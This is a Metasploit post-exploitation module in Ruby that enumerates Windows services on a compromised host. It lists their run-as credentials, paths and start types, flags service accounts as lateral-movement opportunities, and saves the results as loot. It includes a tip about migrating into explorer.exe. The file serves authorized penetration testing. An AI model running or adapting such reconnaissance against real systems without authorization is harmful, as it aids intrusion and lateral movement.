##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Service Info Enumeration',
        'Description' => %q{
          This module will query the system for services and display name and
          configuration info for each returned service. It allows you to
          optionally search the credentials, path, or start type for a string
          and only return the results that match. These query operations are
          cumulative and if no query strings are specified, it just returns all
          services.  NOTE: If the script hangs, windows firewall is most likely
          on and you did not migrate to a safe process (explorer.exe for
          example).
        },
        'License' => MSF_LICENSE,
        'Author' => ['Keith Faber', 'Kx499'],
        'Platform' => ['win'],
        'SessionTypes' => %w[meterpreter powershell shell],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptString.new('CRED', [ false, 'String to search credentials for' ]),
      OptString.new('PATH', [ false, 'String to search path for' ]),
      OptEnum.new('TYPE', [true, 'Service startup option', 'All', ['All', 'Auto', 'Manual', 'Disabled' ]])
    ])
  end

  def run
    credential_count = {}
    qcred = datastore['CRED'] || nil
    qpath = datastore['PATH'] || nil

    if datastore['TYPE'] == 'All'
      qtype = nil
    else
      qtype = datastore['TYPE'].downcase
      print_status("Start Type Filter: #{qtype}")
    end

    if qcred
      qcred = qcred.downcase
      print_status("Credential Filter: #{qcred}")
    end

    if qpath
      qpath = qpath.downcase
      print_status("Executable Path Filter: #{qpath}")
    end

    results_table = Rex::Text::Table.new(
      'Header' => 'Services',
      'Indent' => 1,
      'SortIndex' => 0,
      'Columns' => ['Name', 'Credentials', 'Command', 'Startup']
    )

    print_status('Listing Service Info for matching services, please wait...')

    services = service_list

    vprint_status("Found #{services.length} Windows services")

    services.each do |srv|
      srv_conf = {}

      # make sure we got a service name
      if srv[:name].blank?
        print_error("Problem retrieving service information - no name found for service: #{srv}")
        next
      end

      begin
        srv_conf = service_info(srv[:name])

        next unless srv_conf && srv_conf[:startname] && srv_conf[:path]

        # filter service based on provided filters
        next if qcred && !srv_conf[:startname].downcase.include?(qcred)
        next if qpath && !srv_conf[:path].downcase.include?(qpath)

        # There may not be a 'Startup', need to check nil
        start_type = srv_conf[:starttype]
        start_type = start_type.blank? ? '' : START_TYPE[start_type].to_s

        next if qtype && !start_type.downcase.include?(qtype)

        # count the occurance of specific credentials services are running as
        service_cred = srv_conf[:startname].upcase
        unless service_cred.empty?
          if credential_count.key?(service_cred)
            credential_count[service_cred] += 1
          else
            credential_count[service_cred] = 1
            # let the user know a new service account has been detected for possible lateral
            # movement opportunities
            print_good("New service credential detected: #{srv[:name]} is running as '#{srv_conf[:startname]}'")
          end
        end

        results_table << [
          srv[:name],
          srv_conf[:startname],
          start_type,
          srv_conf[:path]
        ]
      rescue RuntimeError => e
        print_error("An error occurred enumerating service: #{srv[:name]}: #{e}")
      end
    end

    print_status("Found #{results_table.rows.size} Windows services matching filters")

    return if results_table.rows.empty?

    print_line("\n#{results_table}")

    p = store_loot('windows.services', 'text/plain', session, results_table.to_s, 'windows_services.txt', 'Windows Services')
    print_good("Loot file stored in: #{p}")
  end
end
